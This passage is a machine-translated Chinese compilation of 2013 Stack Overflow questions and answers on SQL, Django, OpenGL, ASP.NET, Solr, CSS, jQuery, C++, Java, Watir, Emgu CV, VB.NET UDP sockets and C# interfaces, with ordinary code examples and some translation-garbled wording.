有没有更好的方法来执行这样的查询？我应该创建一个“状态”列的索引吗？如果是这样，它应该是什么样子？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:27:26.873

你想做一个数据透视表。如果您事先知道所有可能的状态值，那么在 SQL 中创建一个简单的方法是使用`sum`和`case`语句。

```
select schedule_id,
       sum(case state when 0 then 1 else 0 end) as state0,
       sum(case state when 1 then 1 else 0 end) as state1,
       sum(case state when 2 then 1 else 0 end) as state2,
       count(*) as total
from schedule_user
group by schedule_id; 
```

另一种方法是使用[交叉](http://www.postgresql.org/docs/9.2/static/tablefunc.html)表函数。

这些都不会让你不知道状态值的集合（以及结果集中的列）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T18:25:10.460

我会尝试

```
SELECT s.schedule_id,
       COUNT(CASE WHEN su.state = 0 THEN 1 END) AS state0,
       COUNT(CASE WHEN su.state = 1 THEN 1 END) AS state1,
       COUNT(CASE WHEN su.state = 2 THEN 1 END) AS state2,
       COUNT(su.state) AS total
  FROM schedule s
  LEFT
 OUTER
  JOIN schedule_user su
    ON su.schedule_id = s.schedule_id
 GROUP
    BY s.schedule_id
; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:28:18.750

标准方法是使用 SUM() 和 CASE，而不是 JOIN 和 GROUP BY：

```
SELECT 
schedule.schedule_id AS id, 
SUM (case when state=0 then 1 else 0 end) AS state0, 
SUM (case when state=1 then 1 else 0 end) AS state1, 
SUM (case when state=2 then 1 else 0 end) AS state2, 
count(*) AS total
FROM schedule
LEFT JOIN schedule_user
  ON schedule_user.schedule_id = schedule.schedule_id
GROUP BY 1 
```

# django - 如何编写排序函数

> ID：15555197
> 
> 赞同：0
> 
> 时间：2013-03-21T18:21:14.320
> 
> 标签：django, python-2.7

我有一个字段，我必须在 Meta 类中编写函数，在我的字段字段中对我的日期进行排序。请帮我

```
from django.db import models

class Aaa(models.Model):
    fields = models.IntegerField()

    class Meta:
        app_label = 'project' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:34:54.890

我建议仔细阅读文档，特别是：[https ://docs.djangoproject.com/en/dev/ref/models/options/#django.db.models.Options.ordering](https://docs.djangoproject.com/en/dev/ref/models/options/#django.db.models.Options.ordering)

```
class Tag(models.Model):
    test_case_counter = models.IntegerField(default=0)
    my_date_field = models.DateField(auto_now=True,auto_add=True)

    class Meta: # notice indentation
        ordering = ['my_date_field']
        app_label = 'project' 
```

# c# - OpenGL将图像平铺到纹理中并耗尽内存

> ID：15555199
> 
> 赞同：1
> 
> 时间：2013-03-21T18:21:19.833
> 
> 标签：c#, opengl, memory, graphics

我正在尝试实现用户可以缩放和平移的世界地图。我遇到了程序内存不足的问题。

这是我的情况：

0) 我正在用 C# 和 OpenGL 编写程序

1) 我从网上下载了一张 JPG 图片，它是世界的详细图片，大小为 19 兆。每个像素长 24 位。

2）当我的程序初始化时，我在运行时将此图像切成小块。我使用 glGenTexture、glBindTexture 和 glTexImage2d 将每个图块输入 OpenGL。

3）在我的绘图程序中，我一个一个地绘制瓷砖并尝试绘制所有瓷砖，无论它们是否在屏幕上（这是另一个问题，我知道）。

对于小图像，一切正常。但是，对于大图像，当我将 JPG 解码为位图以便将其切碎时，我的程序的内存占用量会激增至超过 1 GB。我知道 JPG 是压缩的，而 .NET JpegBitmapDecoder 对象正在解压缩一个巨大的图像，这可能是让我遇到麻烦的原因。

我的问题是，在这种情况下究竟能做什么？由于 C# 解码代码是炸毁内存的第一责任方，是否有另一种创建图块并将它们提供给 OpenGL 的替代方法，而我应该采用这种方法（减去位图）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:07:20.697

显然你应该购买更多的内存！

您可以在 GPU 上以压缩格式存储纹理。请参阅[此页面](http://www.opengl.org/wiki/Image_Format#Compressed_formats)（也是 SC3T/DXT 部分。）您可能还希望根据需要在显存中交换纹理。如果不需要，请不要保留未压缩的数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:00:10.447

我会考虑将 jpg 解码为位图文件并使用位图上的流来异步加载视图中的相关图块数据（或尽可能多的内存可以处理） - 类似于 Android 上的谷歌地图。

我也看到了这一点，但无法确认[“来自位图的 OOM 非常可疑。此类将抛出内存异常，因为几乎所有出现问题，包括错误的参数等。”](https://stackoverflow.com/questions/8247996/c-sharp-saving-very-large-bitmaps-as-jpegs-or-any-other-compressed-format#comment10148394_8247996)

# c# - 将数据列表中的动态数据插入数据库

> ID：15555200
> 
> 赞同：0
> 
> 时间：2013-03-21T18:21:22.653
> 
> 标签：c#, asp.net

我正在使用 Visual Studio 和 c# 创建一个员工名单系统，其中“员工”表中的员工姓名显示在数据列表中。除此之外，我还在 asp 中创建了 2 个下拉列表，与“员工”表分开，尽管它们出现在项目模板标签中以使它们能够在员工姓名旁边动态创建。然后，用户可以从下拉列表中选择员工的轮班开始和结束时间。

我决定使用数据列表和动态下拉列表，因为员工表会经常更新，因为新员工可能会开始或离开，因此未来的轮班表可能包含不同数量的员工。

```
 <table class="style57" width="100%">
        <tr>
            <td class="style70" width="100%">
                        <asp:DataList ID="DataList1" runat="server" DataSourceID="StaffHours" 
                            ShowFooter="False" Width="668px" Height="16px" CellPadding="1" CellSpacing="1"">
                            <ItemTemplate>
                            <table width="100%">
                            <tr>
                            <td class="style76" width="0%">
                            <asp:Label ID="lblStaffID" runat="server" bgcolor="#CCCCCC" Visible=false Text='<%# Eval("StaffID") %>'/>
                            </td>
                            <td class="style73" width="20%">
                                <asp:Label ID="lblFirstName" runat="server" bgcolor="#CCCCCC" Text='<%# Eval("FirstName") %>'/>
                                &nbsp;<asp:Label ID="lblLastName" runat="server" bgcolor="#CCCCCC" Text='<%# Eval("LastName") %>' />
                            </td>
                            <td width="10%"> 
                                <asp:DropDownList ID="ddStartShift" runat="Server">
                                <asp:ListItem  Value="Start Time" Selected="True"></asp:ListItem>
                                <asp:ListItem  Value="06:00"></asp:ListItem>
                                <asp:ListItem  Value="07:00"></asp:ListItem>
                                <asp:ListItem  Value="08:00"></asp:ListItem>
                                <asp:ListItem  Value="09:00"></asp:ListItem>
                                <asp:ListItem  Value="10:00"></asp:ListItem>
                                <asp:ListItem  Value="11:00"></asp:ListItem>
                                <asp:ListItem  Value="12:00"></asp:ListItem>
                                <asp:ListItem  Value="13:00"></asp:ListItem>
                                <asp:ListItem  Value="14:00"></asp:ListItem>
                                <asp:ListItem  Value="15:00"></asp:ListItem>
                                <asp:ListItem  Value="16:00"></asp:ListItem>
                                <asp:ListItem  Value="17:00"></asp:ListItem>
                                <asp:ListItem  Value="18:00"></asp:ListItem>
                                <asp:ListItem  Value="19:00"></asp:ListItem>
                                <asp:ListItem  Value="20:00"></asp:ListItem>
                                <asp:ListItem  Value="21:00"></asp:ListItem>
                                <asp:ListItem  Value="22:00"></asp:ListItem>
                                <asp:ListItem  Value="23:00"></asp:ListItem>
                                <asp:ListItem  Value="00:00"></asp:ListItem>
                                <asp:ListItem  Value="01:00"></asp:ListItem>
                                <asp:ListItem  Value="02:00"></asp:ListItem>
                                <asp:ListItem  Value="03:00"></asp:ListItem>
                                <asp:ListItem  Value="04:00"></asp:ListItem>
                                <asp:ListItem  Value="05:00"></asp:ListItem>
                                </asp:DropDownList>
                                </td>
                                <td width="10%"> 
                                <asp:DropDownList ID="ddEndShift" runat="Server">
                                <asp:ListItem  Value="End Time" Selected="True"></asp:ListItem>
                                <asp:ListItem  Value="06:00"></asp:ListItem>
                                <asp:ListItem  Value="07:00"></asp:ListItem>
                                <asp:ListItem  Value="08:00"></asp:ListItem>
                                <asp:ListItem  Value="09:00"></asp:ListItem>
                                <asp:ListItem  Value="10:00"></asp:ListItem>
                                <asp:ListItem  Value="11:00"></asp:ListItem>
                                <asp:ListItem  Value="12:00"></asp:ListItem>
                                <asp:ListItem  Value="13:00"></asp:ListItem>
                                <asp:ListItem  Value="14:00"></asp:ListItem>
                                <asp:ListItem  Value="15:00"></asp:ListItem>
                                <asp:ListItem  Value="16:00"></asp:ListItem>
                                <asp:ListItem  Value="17:00"></asp:ListItem>
                                <asp:ListItem  Value="18:00"></asp:ListItem>
                                <asp:ListItem  Value="19:00"></asp:ListItem>
                                <asp:ListItem  Value="20:00"></asp:ListItem>
                                <asp:ListItem  Value="21:00"></asp:ListItem>
                                <asp:ListItem  Value="22:00"></asp:ListItem>
                                <asp:ListItem  Value="23:00"></asp:ListItem>
                                <asp:ListItem  Value="00:00"></asp:ListItem>
                                <asp:ListItem  Value="01:00"></asp:ListItem>
                                <asp:ListItem  Value="02:00"></asp:ListItem>
                                <asp:ListItem  Value="03:00"></asp:ListItem>
                                <asp:ListItem  Value="04:00"></asp:ListItem>
                                <asp:ListItem  Value="05:00"></asp:ListItem>
                                </asp:DropDownList>
                                </td>
                            </tr>
                         </table>
                         </ItemTemplate>
                        </asp:DataList>
                        <asp:SqlDataSource ID="StaffHours" runat="server" 
                            ConnectionString="<%$ ConnectionStrings:myConnectionString %>" 
                            SelectCommand="SELECT [StaffID], [FirstName], [LastName] FROM [Staff]">
                        </asp:SqlDataSource>
                    </td>
        </tr>
</table> 
```

由于这些下拉列表是在数据列表中动态创建的，因此我无法弄清楚如何将每个员工的值插入到“Rota”表中，因为它们没有被识别，因此我无法将它们输入到存储过程的参数中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:00:53.343

将 的`DataKeyField`设置`DataList`为`StaffID`：

```
<asp:DataList ID="DataList1" runat="server" DataSourceID="StaffHours" 
DataKeyField = "StaffID" ShowFooter="False" Width="668px" 
Height="16px" CellPadding="1" CellSpacing="1""> 
```

这将允许您在回发处理数据时检索 StaffID：

```
for(int index = 0;index < DataList1.Items.Count;index++)
{
    int staffID = (int) DataList1.DataKeys[index];
    DropDownList ddStartShift = (DropDownList) DataList1.Items[index].FindControl("ddStartShift");
    // etc.

} 
```

有关 DataKeys 属性的更多信息： [BaseDataList DataKeys 属性](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.basedatalist.datakeys.aspx)

# solr - Solr DataImportHandler - JOIN 与单独的实体

> ID：15555202
> 
> 赞同：5
> 
> 时间：2013-03-21T18:21:26.770
> 
> 标签：solr, dataimporthandler

在 Solr DIH data-config.xml 中，使用 JOIN 在主实体中查询尽可能多的字段是否更好，例如：

```
<entity name="Lists" 
        pk="l.list_id" 
        query="SELECT l.list_id AS id, l.user_id, lo.is_votable FROM lists l
                 INNER JOIN list_options lo ON lo.list_id = l.list_id"> 
```

或使用单独的子实体，例如：

```
<entity name="Lists" 
        pk="l.list_id" 
        query="SELECT l.list_id AS id, l.user_id FROM lists l">

  <entity name="ListOptions" 
          query="SELECT lo.is_votable FROM list_options lo 
                   WHERE lo.list_id=${Lists.id}" />

</entity> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-22T04:29:31.113

一些可以帮助您决定的指针：-

*   子实体对每条记录进行查询，因此如果您有大量集合，性能会变慢。
*   如果您有一对一的映射，则可以使用联接，以便通过一个查询本身获取所有字段。
*   如果您有多个根记录，您将使用可能会创建多值字段的子实体。（您不能使用单个连接查询，因为它会为同一个文档返回多行，除非您想要这种行为）

# reporting-services - SSRS 全文对齐

> ID：15555205
> 
> 赞同：-2
> 
> 时间：2013-03-21T18:21:37.773
> 
> 标签：reporting-services

我已经阅读了几十个关于这个主题的主题，我知道在 Word、Excel、Crystal Reports 等报告服务中证明文本是不可能的。..

我也知道微软在 2013 年还没有提供这个选项是不可接受的，但我真的必须以一种或另一种方式解决这个问题......

所以，正如我所说，在阅读了关于这个主题的几十个主题之后，我得出结论，我唯一的选择是制作一个自定义报告项目......但问题是我不能这样做，因为它对我来说太复杂了......

有没有人为此目的构建了一个自定义报告项目并且很友好地分享它？

提前谢谢了！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T02:53:10.400

一些谷歌搜索表明有第三方产品可以提供这种附加功能。

Aspose 就是一个例子：[http ://www.aspose.com/docs/display/pdfreportingservices/Justify+FullJustify+Text+Alignment](http://www.aspose.com/docs/display/pdfreportingservices/Justify+FullJustify+Text+Alignment)

# css - 多个字符集中的 CSS 字体堆栈名称

> ID：15555207
> 
> 赞同：0
> 
> 时间：2013-03-21T18:21:41.620
> 
> 标签：css, character-encoding, fonts, multilingual

例如，对于韩语，“Dotum”字体名称也写为“돋움”。是否有必要使用如下字体堆栈：

```
body {
   font-family: "돋움", "Dotum", sans-serif;
} 
```

这可能会解释安装了韩文名称版本但没有安装罗马名称版本的用户，反之亦然。

如果是这种情况，“Dotum”应该退回到“돋움”还是相反？

为清楚起见编辑：

是否有必要在字体堆栈中同时指定给定韩文字体的韩文命名版本和罗马命名版本？追问：哪个版本比较常见？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:49:18.210

Either way, basically the code will first check for 돋움 and then proceed with Dotum. Hence why you include sans-serif at the end, this means if it doesn't find any of the suggested fonts it will simply use any sans-serif font.

# jquery - 加载“onload”但不是“no wrap - in”时有效的jquery脚本我该如何解决这个问题？

> ID：15555212
> 
> 赞同：0
> 
> 时间：2013-03-21T18:21:56.597
> 
> 标签：jquery, mediawiki

我有这个项目的[jsfiddle](http://jsfiddle.net/ShoeMaker/5GpuH/1/)。当小提琴设置为“onLoad”时，它会按原样删除元素。但是，当我将下拉菜单翻转为“不换行”时，它不起作用。我需要它“无包装”工作，因为我在维基百科上使用它，这就是他们加载脚本的方式。我的代码是：

```
$('span.mw-usertoollinks a:last').remove();
$('span.mw-usertoollinks').each(function() {
    this.innerHTML = this.innerHTML.replace(" | )", ")");
}); 
```

假设从以下位置删除块链接和之前`|`：

```
<span class="mw-usertoollinks">
    (
    <a href="/UT:T13" class="mw-redirect" title="UT:T13">Talk</a>
     | 
    <a href="/S:Contributions/T13" title="S:Contributions/T13">contributions</a>
     | 
    <a href="/S:Block/T13" title="S:Block/T13">block</a>
    )
</span> 
```

注意：我将 User_talk: 缩写为 UT: 和 Special: 缩写为 S: 以使其更适合代码框。其他都是原创的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:24:24.237

它在外部不起作用，`onload`因为您尝试选择的 DOM 元素在代码运行时不存在。幸运的是，你可以像这样在 jQuery 中包装你的代码：

```
$(function() {
    // your code here
}); 
```

它只会*在*DOM 加载后运行。

这是一个[小提琴](http://jsfiddle.net/5GpuH/4/)

请注意，这`$(function(){...});`是`$(document).ready(function(){...});`. 您正在做的是附加代码以仅在触发 document.ready 事件后运行（即在 DOM 完全加载后）。

**更新**

从技术上讲，这是另一个问题，但这[应该](http://jsfiddle.net/5GpuH/7/)对您有用：

```
$(function() {
    $('span.mw-usertoollinks').each(function () {
        var $elem = $(this);
        $elem.children('a:last').replaceWith("-");
        $elem.html($elem.html().replace(" | -", ""));
    });
 }); 
```

请注意，当您使用 时`$.each`，即使使用 jQuery 选择器，您也正在迭代 DOM 节点的集合，而不是 jQuery 对象。所以`this`需要像这样转换成一个jQuery对象：`$(this)`才能使用jQuery函数就可以了。我正在缓存生成的 jQuery 对象，`$elem`以避免必须不断重新创建它。

我们使用`children`选择器来选择子节点以`a:last`仅选择最后一个`a`链接。然后我们使用`.html()`来操作 的内容`$elem`并移除尾随字符。

# c++ - 带有 std::all_of( ) 和 std:none_of( ) 的空容器的好习惯？

> ID：15555218
> 
> 赞同：3
> 
> 时间：2013-03-21T18:22:08.767
> 
> 标签：c++, c++11, stl-algorithm

对于空容器， std::all_of( ) 和 std:none_of( ) 都返回 true。

除了辩论这个概念方面，有人可以提出一个不要求始终检查容器是否为空并检查 all_of 或 none_of 的习语吗？

这很麻烦，因为在空容器上的两种算法中使用相同的谓词将表明该谓词对于元素的 ALL 和 NONE 都是正确的。因此，您的（空）向量是 all_of “odd”、all_of “even”、none_of “odd”和 none_of “even”。

在更实际的层面上，我正在考虑检查项目集合的状态，例如任何“准备处理”，并期望一个空集合对应于“否，没有准备好处理的元素”。我知道我可以单独检查它是否为空，但我正在寻找其他可能性。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-21T18:44:50.567

> 在更实际的层面上，我正在考虑检查项目集合的状态，例如任何“准备处理”，并期望一个空集合对应于“否，没有准备好处理的元素”。

这就是为什么返回一个空集合。`std::**any**_of()``false`

如果问题是“是否*所有*项目都已完成处理？”，那么预期答案将是“是的，一切都已完成”。如果首先没有要处理的项目（就是这种`std::all_of()`情况）。

类似地，问题“处理过程中没有发生错误吗？” 将回答“是的，没有错误”。对于一个空列表（没有工作->没有错误）。这就是`std::none_of()`检查的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T18:34:40.030

如果容器为空，您可以编写自己的包装器并使用它来修改结果：

```
// in your namespace, not std:
template< class InputIt, class UnaryPredicate >
bool none_of( InputIt first, InputIt last, UnaryPredicate p )
{
  return first != last && std::none_of( first, last, p );
} 
```

# java - 带有加权柏林噪声的地图生成器

> ID：15555222
> 
> 赞同：0
> 
> 时间：2013-03-21T18:22:29.170
> 
> 标签：java, random, perlin-noise, stochastic

我有任意数量的柏林噪声图和每个的权重。所有权重的总和为 1，但这不应该有所作为。

我想得到关于重量的最高值的噪音。

我的第一种方法是从每个 perlin 噪声中获取数字，将它们转换为百分比（我有一个循环表），乘以权重并选择最高值。但是这种方法有一个巨大的缺陷：它区分较小的权重而偏爱较大的权重，因此会打乱分布。我希望 0.2 的权重出现在 20% 中。

我想将其用于地图生成器以选择图块类型。我使用多个 perlin 噪声，因为我想使用许多不同的瓦片类型来彼此相邻，因此不能使用渐变。

有谁知道如何修复这个缺陷，或者用不同的方式生成基于瓦片的地图？

编辑：同时我想出了一个几乎可以接受的解决方案：

```
final float[] values = new float[noises.length];
for (int i = 0; i < values.length; i++)
    values[i] = noises[i].get(x, y) * (1f + (weights[i] - 1f / noises.length));

int max = 0;
for (int i = 1; i < values.length; i++)
    if (values[i] > values[max])
        max = i;
return noises[max]; 
```

唯一的缺陷是不精确。即使权重为 0f，仍然会在大约 6% 的时间内返回噪声。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:40:39.567

也许解决方案是这样的：

```
Perlin pickOne(Perlin[] noise, double[] weights) {
   double sum = 0;
   for(double weight : weights) sum += weight;
   double choice = Math.random() * sum;
   for(int i = 0; i < weights.length; ++i) {
      choice -= weights[i];
      if(choice <= 0) {
         return noise[i];
      }
   }
   throw new IllegalArgumentException("Must have at least one weight!");
} 
```

（也就是说，完全根据权重而不是地图值来选择噪声图之一。我在这里选择它所做的工作可以想象为将所有权重首尾相连地布置在数轴上，在其中选择一个值，然后找出它属于哪个权重。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T00:10:24.117

“我的第一个方法是从每个 perlin 噪声中获取数字，将它们转换为百分比（我有一个循环表），乘以权重并选择最高值。但这种方法有一个巨大的缺陷：它区分较小权重并偏爱较大的，因此会打乱分布。我希望 0.2 的权重出现在 20% 中。”

我的建议是：

1) 将所有百分比*权重相加

2）在0和sum之间选择一个随机数

3）枚举添加百分比*重量项目，直到你超过你的随机数 - 选择那个

这将对按百分比*权重加权的所有可能性进行随机分布，因此如果您有 2、8 和 6，则 2 出现 2/16 的时间，8 8/16 的时间和6 6/16 的时间。

# watir-webdriver - Watir::LI #attributes 方法未找到

> ID：15555225
> 
> 赞同：3
> 
> 时间：2013-03-21T18:22:39.267
> 
> 标签：watir-webdriver

我在带有 ruby​​ 1.9.3 的 Mac 上使用[watir-webdriver](http://watirwebdriver.com/) (0.6.2)。我的测试脚本找到了`<li my-attr="my-value">...</li>`我需要的元素，但该`Watir::LI`实例没有文档所说的任何 AttributeHelper 方法 ( `#attribute_list`, `#attributes`, )。`#typed_attributes`我的测试脚本需要确认该`my-attr`属性具有值`my-value`。

我在这里遗漏了一些明显的东西吗？`Watir::LI`一旦我有了实例，是否有不同的方法来获取属性值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T19:11:24.373

您应该使用该`Element#attribute_value`方法来获取属性值。

例如，假设 html

```
<li my-attr="my-value">your text</li> 
```

然后可以通过以下方式检索 my-attr 值：

```
browser.li.attribute_value("my-attr")
#=> "my-value" 
```

# matrix - Emgu CV 中的 Matrix.Reshape() 函数

> ID：15555232
> 
> 赞同：0
> 
> 时间：2013-03-21T18:23:13.123
> 
> 标签：matrix, emgucv

谁能告诉我关于 Matrix Reshape(int newChannels, int newRows) 函数的信息。什么是参数 newChannels 的意思？我的代码如下

```
Matrix<Double> A = new Matrix<Double>(4, 4);
Matrix<Double> reshapeMatrix;
reshapeMatrix = A.Reshape(1, 16); 
```

此代码工作正常。但

```
 reshapeMatrix = A.Reshape(2, 8); 
```

此代码成功运行，但 reshapeMatrix 大小不正确，我无法使用 reshapeMatrix 数据。

谁能解释为什么会这样？我如何对任何大小的矩阵使用 reshape() 函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-28T15:38:06.310

As you noticed, Matrix.Reshape takes newChannels as first argument. A matrix can have several channels, for example color channels (1 for grayscale, 3 for RGB). What Reshape does is that it reshapes both channels, columns and rows of the matrix.

What you want to achieve with `reshapeMatrix = A.Reshape(2, 8);` is probably to reshape the matrix so that it has 2 columns and 8 rows, but still one color channel. Or am I wrong?

If that is what you want to achieve, the correct way to do it is:

```
reshapeMatrix = A.Reshape(1, 8); 
```

As there are 16 elements and 8 rows, the number of columns will automatically be 2\. The number of channels is still kept to one.

The reason why `reshapeMatrix = A.Reshape(1, 16);` works is because you specify that you should keep having one color channel. And with 16 rows, the only option left is to have one column.

# javascript - 如何隐藏和显示 onclick 当已经有点击动作时？

> ID：15555235
> 
> 赞同：0
> 
> 时间：2013-03-21T18:23:22.150
> 
> 标签：javascript, css, ajax, show-hide, blogger

我已经尝试了很多东西，但似乎没有任何效果。

我想隐藏`<div id="disqus_thread">`，并在单击链接“*评论*”时显示它，当评论加载时（链接在我文章的底部：“ *commentaires* ”，在[我的博客上](http://www.julienlussiez.com/2013/01/le-repos-du-fou_21.html)）。

我有一个与 的链接`onclick`，但我无法添加其他操作。

我怎么能设法让这两个动作都在点击时触发？

**CSS：**

```
#disqus_thread {display:none; margin-top: -40px; background: #fff;
background: #fff;
padding:20px;
border: 1px solid #ddd;} 
```

我尝试使用 css 隐藏 div，但我不知道如何显示它。

* * *

**HTML：**

```
<li class='commenting'>
  <span class=''>
    <a class='' expr:href='data:post.addCommentUrl' onclick='$.ajaxSetup({cache:true});$.getScript(&quot;http://julienlussiez.disqus.com/embed.js&quot;);$.ajaxSetup({cache:false});$(&quot;#disqus_loader&quot;).remove();' title='Laisser un commentaire'>Commentaires</a>
  </span>
</li> 
```

有一个`onclick`功能，但我不能添加任何东西。
它是不正确的，或者更确切地说，写得不好？

* * *

**脚本：**

```
<script>
    function load_disqus()
    {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = "http://julienlussiez.disqus.com/embed.js";
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      var ldr = document.getElementById('disqus_loader');
      ldr.parentNode.removeChild(ldr);
    }
</script>

<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    $.Ajaxify.pageChange(function() {

        var disqus_shortname = 'julienlussiez';
        // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();});
</script>
<a name="bottom"></a> 
```

此脚本从 disqus 加载评论而不会中断。这很好，因为我的博客上有一个音乐播放器。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:29:42.570

不幸的是，您只能为元素分配一键式功能。

为了让它工作，试着把你的函数堆叠成一个新函数，然后`onclick`通过 javascript 将它分配给：

HTML：

```
<div id='test'></div> 
```

JS：

```
var div = document.getElementById('test');

div.onclick = function () { alert("some function") };

// hides the div
div.onclick = stackFunction(div.onclick, function () { 
    div.style.display = "none"; 
});

function stackFunction(last, f) {
    return function () { last(); f(); };
} 
```

[小提琴](http://jsfiddle.net/eKdLh/2/)

# .net - 为什么本地 UDP 数据包不发送？

> ID：15555238
> 
> 赞同：0
> 
> 时间：2013-03-21T18:23:36.507
> 
> 标签：.net, vb.net, udp, udpclient

我正在尝试编写一个非常简单的 UDP 客户端/服务器对，它将在同一台计算机上一起工作（目前），但我的数据包都没有被传递。下面的代码是一个 100% 完整的 VB.NET 控制台应用程序。它运行时不会抛出错误，但 mListener.Receive 命令永远不会返回。

问题1：为什么我没有收到任何数据包？

问题 2：为什么我不能让我的客户使用 IPAddress.Any 作为端点？当我尝试连接到 New IPEndPoint(IPAddress.Any, 10123) 时，我收到“请求的地址在其上下文 0.0.0.0:10123 中无效”异常。

```
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading

Module Module1
    Sub Main()
        Dim ep As New IPEndPoint(IPAddress.Loopback, 10123)
        Dim s As New Server(ep)
        Dim c As New Client(ep)
        Do
            Console.WriteLine("Waiting in main loop...")
            Thread.Sleep(5000)
        Loop
    End Sub
End Module

Public Class Server
    Private mBroadcaster As UdpClient

    Public Sub New(ep As IPEndPoint)
        mBroadcaster = New UdpClient
        mBroadcaster.ExclusiveAddressUse = False
        mBroadcaster.Connect(ep)
        Dim sender As New Thread(AddressOf SendLoop)
        sender.Start()
    End Sub

    Private Sub SendLoop()
        Do
            Dim msg As Byte() = Text.ASCIIEncoding.ASCII.GetBytes("Hello world")
            Console.WriteLine("Sending...")
            mBroadcaster.Send(msg, msg.Length)
            Thread.Sleep(1000)
        Loop
    End Sub
End Class

Public Class Client
    Private mListener As UdpClient

    Public Sub New(ep As IPEndPoint)
        mListener = New UdpClient
        mListener.ExclusiveAddressUse = False
        mListener.Connect(ep) 'Why can't I use IPAddress.Any here?
        Dim poller As New Thread(AddressOf PollLoop)
        poller.Start()
    End Sub

    Private Sub PollLoop()
        Do
            Dim ep As IPEndPoint = Nothing
            Console.WriteLine("  Receiver listening...")
            Dim incomingbytes As Byte() = mListener.Receive(ep)
            Dim msg As String = Text.ASCIIEncoding.ASCII.GetString(incomingbytes)
            Console.WriteLine("  Received: " & msg & " from " & ep.Address.ToString & ":" & ep.Port)
        Loop
    End Sub
End Class 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:34:31.397

我仍然不知道为什么原始代码不起作用，但我确实找到了一种方法来完成原始代码的意图。基本思想是对服务器使用 UdpClient 显然没问题，但对……客户端使用 UdpClient 是不行的。相反，我将 UdpClient 更改为较低级别的 Socket。我怀疑用 Socket 替换服务器的 UdpClient 也可以，但我还没有测试过。这也解决了问题 2（原始 Socket 允许侦听 IPAddress.Any）。

我仍然会接受一个不同的答案，它实际上解释了为什么会这样。

```
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading

Module Module1
    Sub Main()
        Dim s As New Server
        Dim c As New Client
        Do
            Console.WriteLine("Waiting in main loop...")
            Thread.Sleep(5000)
        Loop
    End Sub
End Module

Public Class Server
    Private mBroadcaster As UdpClient

    Public Sub New()
        mBroadcaster = New UdpClient
        mBroadcaster.ExclusiveAddressUse = False
        mBroadcaster.Connect(New IPEndPoint(IPAddress.Broadcast, 10123))
        Dim sender As New Thread(AddressOf SendLoop)
        sender.Start()
    End Sub

    Private Sub SendLoop()
        Do
            Dim msg As Byte() = Text.ASCIIEncoding.ASCII.GetBytes("Hello world")
            Console.WriteLine("Sending...")
            mBroadcaster.Send(msg, msg.Length)
            Thread.Sleep(1000)
        Loop
    End Sub
End Class

Public Class Client
    Private mListener As Socket

    Public Sub New()
        mListener = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
        mListener.ExclusiveAddressUse = False
        mListener.Bind(New IPEndPoint(IPAddress.Any, 10123))
        Dim poller As New Thread(AddressOf PollLoop)
        poller.Start()
    End Sub

    Private Sub PollLoop()
        Dim buffer As Byte() = New Byte(1023) {}
        Do
            Console.WriteLine("  Receiver listening...")
            Dim nbytes As Integer = mListener.Receive(buffer)
            Dim msg As String = Text.ASCIIEncoding.ASCII.GetString(buffer, 0, nbytes)
            Console.WriteLine("  Received: " & msg)
        Loop
    End Sub
End Class 
```

# c# - 接口中的属性不是数据吗？

> ID：15555240
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:23:47.893
> 
> 标签：c#

接口中不可能有实例变量或任何实现。但是我们可以有属性。属性不只是获取和设置方法吗？获取和设置方法不仅仅是获取和设置变量的方法吗？这不是作弊吗？据我所知，C++ 和 Java 不允许这样做。似乎 C# 中接口的实现并不那么“纯粹”。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:26:07.467

> 属性不只是获取和设置方法吗？

是的，他们是。他们是*方法*。行为，而不是关于如何实现该行为的实现细节。这就是属性和字段之间的区别——这就是接口中允许属性的原因。

> 获取和设置方法不仅仅是获取和设置变量的方法吗？

不，它们是方法。它们可以随心所欲地实施。它们*可以*通过简单的字段来实现——但它们可能不是。（你认为`DateTime.Now`阅读哪个领域？）

> 据我所知，C++ 和 Java 不允许这样做。

Java当然允许您将getter和setter方法放在接口上......

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-21T18:26:34.790

您在接口中看到的不是具体的属性，它只是*属性*签名（例如，属性名称、返回类型访问修饰符，以及它是否具有 get 和 set）***必须看起来像***的定义在任何实现此接口的类中。

在接口中，它***不是***一个 get 和 set 方法，它根本不是一个实际的方法，它只是 get 和 set 方法在任何实现此接口的类中必须看起来的定义。

